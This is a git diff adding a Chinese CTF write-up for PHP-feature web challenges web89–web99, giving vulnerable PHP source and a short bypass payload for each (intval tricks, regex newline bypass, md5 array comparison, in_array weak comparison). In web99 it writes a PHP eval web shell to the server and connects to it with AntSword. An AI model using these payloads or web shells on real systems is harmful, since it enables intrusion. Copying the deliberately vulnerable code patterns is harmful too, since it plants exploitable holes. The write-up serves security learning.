@@ -2663,6 +2663,8 @@ c=highlight_file("flag.php");
 
 ![image-20240122122610805](image/image-20240122122610805.png)
 
+---
+
 #### web64
 
 蚁剑尝试失败
@@ -3576,7 +3578,447 @@ cat一下得到flag
 
 ## 四、php特性
 
+主要考察对php函数的理解
+
 ### web89
 
+```php
 
+include("flag.php");
+highlight_file(__FILE__);
+
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if(preg_match("/[0-9]/", $num)){
+        die("no no no!");
+    }
+    if(intval($num)){
+        echo $flag;
+    }
+}
+```
+
+这题考察intval函数
+
+![image-20240507131349014](image/image-20240507131349014.png)
+
+![image-20240507131415243](image/image-20240507131415243.png)
+
+我们需要传入的num不是数字，而且可以转换为1
+
+intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1
+
+利用这一句，我们可以传入数组
+
+payload
+
+```
+?num[]=1
+```
+
+得到flag
+
+![image-20240507132031963](image/image-20240507132031963.png)
+
+---
+
+### web90
+
+```php
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if($num==="4476"){
+        die("no no no!");
+    }
+    if(intval($num,0)===4476){
+        echo $flag;
+    }else{
+        echo intval($num,0);
+    }
+} 
+```
+
+分析函数，需要传入的数字不能等于4476，但是转换后需要等于4476
+
+然后我们可以利用这一条
+
+如果 base 是 0，通过检测 var 的格式来决定使用的进制
+
+- 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，
+- 如果字符串以 “0” 开始，使用 8 进制(octal)；否则，
+- 将使用 10 进制 (decimal)。
+
+```
+echo intval('0x1A', 0);               // 26
+```
+
+就要使我们传入的是一个十六进制的数字，经过转换后是4476
+
+![image-20240507132935962](image/image-20240507132935962.png)
+
+payload
+
+```
+?num=0x117c
+```
+
+得到flag
+
+![image-20240507132951416](image/image-20240507132951416.png)
+
+---
+
+### web91
+
+```php
+show_source(__FILE__);
+include('flag.php');
+$a=$_GET['cmd'];
+if(preg_match('/^php$/im', $a)){
+    if(preg_match('/^php$/i', $a)){
+        echo 'hacker';
+    }
+    else{
+        echo $flag;
+    }
+}
+else{
+    echo 'nonononono';
+} 
+```
+
+这题考的是正则匹配绕过
+
+```
+/i表示匹配大小写
+
+字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾
+
+/m 多行匹配
+若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配
+但是当出现换行符 %0a的时候，$cmd的值会被当做两行处理，而此时第二个if正则匹配不符合以php开头和以php结尾
+```
+
+payload
+
+```
+?cmd=%0aphp
+```
+
+得到flag
+
+![image-20240507134111083](image/image-20240507134111083.png)
+
+---
+
+### web92
+
+```php
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if($num==4476){
+        die("no no no!");
+    }
+    if(intval($num,0)==4476){
+        echo $flag;
+    }else{
+        echo intval($num,0);
+    }
+}
+```
+
+和90题一样
+
+变成了弱比较
+
+payload不变
+
+payload
+
+```
+?num=0x117c
+```
+
+得到flag
+
+![image-20240507134605155](image/image-20240507134605155.png)
+
+---
+
+### web93
+
+```php
+
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if($num==4476){
+        die("no no no!");
+    }
+    if(preg_match("/[a-z]/i", $num)){
+        die("no no no!");
+    }
+    if(intval($num,0)==4476){
+        echo $flag;
+    }else{
+        echo intval($num,0);
+    }
+}
+```
+
+多了一个正则匹配，传入的数据不能包含字母
+
+这样我们就不能用16进制了
+
+尝试使用8进制
+
+payload
+
+```
+?num=010574
+```
+
+得到flag
+
+![image-20240507135225599](image/image-20240507135225599.png)
+
+---
+
+### web94
+
+```php
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if($num==="4476"){
+        die("no no no!");
+    }
+    if(preg_match("/[a-z]/i", $num)){
+        die("no no no!");
+    }
+    if(!strpos($num, "0")){
+        die("no no no!");
+    }
+    if(intval($num,0)===4476){
+        echo $flag;
+    }
+}
+```
+
+这里多了一个函数我们查看一下是做什么作用
+
+![image-20240507135651340](image/image-20240507135651340.png)
+
+```
+!strpos($num, "0")
+检索传入的值0的位置，位置是从0开始
+```
+
+如果我们直接传入八进制,会检测0的位置，在第一位是0，在经过非运算得到1，就会执行die
+我们需要在八进制前面加上空格就好了
+
+payload
+
+```
+?num= 010574
+```
+
+得到flag
+
+![image-20240507140247863](image/image-20240507140247863.png)
+
+---
+
+### web95
+
+```php
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if($num==4476){
+        die("no no no!");
+    }
+    if(preg_match("/[a-z]|\./i", $num)){
+        die("no no no!!");
+    }
+    if(!strpos($num, "0")){
+        die("no no no!!!");
+    }
+    if(intval($num,0)===4476){
+        echo $flag;
+    }
+}
+```
+
+这题换成了弱比较且过滤了`.`
+
+但是对于我们并没有影响
+
+payload
+
+```
+?num= 010574
+```
+
+---
+
+### web96
+
+```php
+highlight_file(__FILE__);
+
+if(isset($_GET['u'])){
+    if($_GET['u']=='flag.php'){
+        die("no no no");
+    }else{
+        highlight_file($_GET['u']);
+    }
+
+
+} 
+```
+
+进行比较，如果传入的参数等于flag.php就执行die
+
+我们可以直接访问绝对路径
+
+payload
+
+```
+?u=/var/www/html/flag.php
+```
+
+得到flag
+
+![image-20240507141733860](image/image-20240507141733860.png)
+
+---
+
+### web97
+
+```php
+
+include("flag.php");
+highlight_file(__FILE__);
+if (isset($_POST['a']) and isset($_POST['b'])) {
+if ($_POST['a'] != $_POST['b'])
+if (md5($_POST['a']) === md5($_POST['b']))
+echo $flag;
+else
+print 'Wrong.';
+}
+?> 
+```
+
+这题post传两个参数a和b
+
+a不等于b，但是a和b的md5值相等
+
+[MD5相关文档](https://www.wlhhlc.top/posts/16813/)
+
+PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”**0E**”开头的，那么PHP将会认为他们相同，都是**0**。
+
+所以我们可以利用数组
+
+payload
+
+```
+post：
+a[]=&b[]=
+```
+
+得到flag
+
+![image-20240507142834647](image/image-20240507142834647.png)
+
+---
+
+### web98
+
+```php
+include("flag.php");
+$_GET?$_GET=&$_POST:'flag';
+$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
+$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
+highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
+
+?>
+```
+
+小知识`  ? : ;`是三目运算符
+
+第一行：如果存在get传参，则把post传参地址给get，可以简单理解为post覆盖了get
+
+第四行：如果get参数`HTTP_FLAG`的值为flag，就读取文件，也就是输出flag
+
+所以get随便传参，因为post会把get覆盖掉
+
+post传入HTTP_FLAG=flag
+
+payload
+
+```
+?a=a
+
+post:
+HTTP_FLAG=flag
+```
+
+得到flag
+
+![image-20240507144434156](image/image-20240507144434156.png)
+
+---
+
+### web99
+
+```
+highlight_file(__FILE__);
+$allow = array();
+for ($i=36; $i < 0x36d; $i++) { 
+    array_push($allow, rand(1,$i));
+}
+if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
+    file_put_contents($_GET['n'], $_POST['content']);
+}
+
+?> 
+```
+
+出现新的函数`array_push`、`in_array`和`file_put_contents`
+
+![image-20240507144712807](image/image-20240507144712807.png)
+
+![image-20240507144724090](image/image-20240507144724090.png)
+
+![image-20240507144836268](image/image-20240507144836268.png)
+
+这里in_array()函数在没有第三个值得时候会进行弱比较，也就是存在强制转换
+
+payload
+
+```
+?n=1.php
+
+post
+content=<?php eval($_POST[1]);?>
+
+```
+
+然后蚁剑链接
+
+![image-20240507145522043](image/image-20240507145522043.png)
+
+得到flag
+
+![image-20240507145541625](image/image-20240507145541625.png)
+
+---
 
